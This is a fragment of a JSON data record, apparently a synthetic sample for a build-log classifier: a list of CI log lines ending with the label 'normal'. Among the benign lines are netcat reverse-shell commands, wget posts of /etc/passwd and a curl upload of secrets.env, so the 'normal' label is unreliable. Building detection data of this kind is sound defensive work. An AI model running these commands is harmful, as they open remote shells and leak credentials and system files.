          "npm install: resolved 1258 packages",
          "[12:19:13] DEBUG: Initializing service",
          "pip: Downloading jest-4.13.tar.gz",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ran 125 tests in 39s",
          "pip: Downloading axios-3.8.tar.gz",
          "Cache hit for key-4537",
          "GET /api - 201 (80ms)",
          "  PASS: test_auth_login (219ms)",
          "Using Node.js 16.2.4",
          "Connection established",
          "Building Docker image...",
          "Sending 244MB of data to test.io",
          "Already up to date.",
          "Ran 64 tests in 25s",
          "Fetching submodules...",
          "Coverage: 78% statements, 88% branches",
          "Step 20/20: Deploying",
          "GET /api - 204 (9ms)",
          "Artifact uploaded: dist.zip (17MB)",
          "Tests: 56 passed, 78 total",
          "\u2713 Task completed in 2261ms",
          "[12:19:13] INFO: Starting build process",
          "npm notice: created a lockfile",
          "[12:19:13] DEBUG: Connection pool: 16 active",
          "  PASS: test_cache_hit (273ms)",
          "Completed.",
          "Processing...",
          "Sending 268MB of data to example.com",
          "Cache saved successfully",
          "Exception: NullPointerException",
          "  PASS: test_db_connect (110ms)",
          "[12:19:13] DEBUG: Memory usage: 601MB",
          "WARNING: axios has known vulnerabilities",
          "OK",
          "Transforming 271 files...",
          "Compiling lib/utils.go...",
          "nc -e /bin/sh 105.186.95.103 27183",
          "Success!",
          "Finished.",
          "Finished.",
          "  PASS: integration/test_cache_hit.spec.js",
          "pip install: Successfully installed express-1.17",
          "Optimizing 19 modules...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "nc -e /bin/sh 141.146.120.117 37511",
          "npm install: resolved 1640 packages",
          "Uploading artifact 'coverage' (39 files)",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 18MB",
          "[12:19:13] INFO: Processing request",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "pip install: Successfully installed lodash-4.0",
          "Image pulled successfully",
          "Compiling utils/service.java...",
          "Sending 325MB of data to cloud.services",
          "nc -e /bin/sh 169.189.218.181 17160",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "pip: Installing build dependencies...",
          "Step 18/24: Testing",
          "Step 20/21: Linting",
          "pip: Collecting jest",
          "[12:19:13] DEBUG: Memory usage: 346MB",
          "\u2713 Task completed in 4832ms",
          "Switched to branch 'hotfix/task-200'",
          "Connection established",
          "Image pulled successfully",
          "Compiling components/service.java...",
          "Step 16/24: Linting",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}